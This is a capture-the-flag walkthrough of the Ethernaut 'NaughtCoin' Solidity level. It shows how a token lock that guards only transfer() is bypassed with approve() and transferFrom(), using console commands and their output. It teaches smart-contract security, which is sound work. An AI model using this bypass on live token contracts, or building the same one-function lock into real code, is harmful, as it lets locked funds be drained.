# NaughtCoin

## Keys

We need that `msg.sender != player`. We can use a `transferFrom()` that allows us to delegate the transfer to a third party.

> You can use both transfer() and transferFrom() to move tokens around
> The lockTokens() modifier is only applied to the transfer() function.
> https://medium.com/coinmonks/ethernaut-lvl-15-naught-coin-walkthrough-how-to-abuse-erc20-tokens-and-bad-icos-6668b856a176

## Solution

1. Check player's balance

```
> (await contract.balanceOf(player)).toString()
"1000000000000000000000000"
```

2. Use `approve()` for the player to be able to transfer that balance.

```
> await contract.approve(player, "1000000000000000000000000")
```

3. Verify the amount for the `allowance()`

```
> (await contract.allowance(player, player)).toString()
"1000000000000000000000000"
```

4. Do the transferFrom()

```
await contract.transferFrom(player, "0x3533916-ANYACCOUNT", "1000000000000000000000000")
```

5. Verify the player doesn't have more balance

```
> (await contract.balanceOf(player)).toString()
"0"
```

## Post-solution information

When using code that's not your own, it's a good idea to familiarize yourself with it to get a good understanding of how everything fits together. This can be particularly important when there are multiple levels of imports (your imports have imports) or when you are implementing authorization controls, e.g. when you're allowing or disallowing people from doing things. In this example, a developer might scan through the code and think that transfer is the only way to move tokens around, low and behold there are other ways of performing the same operation with a different implementation.
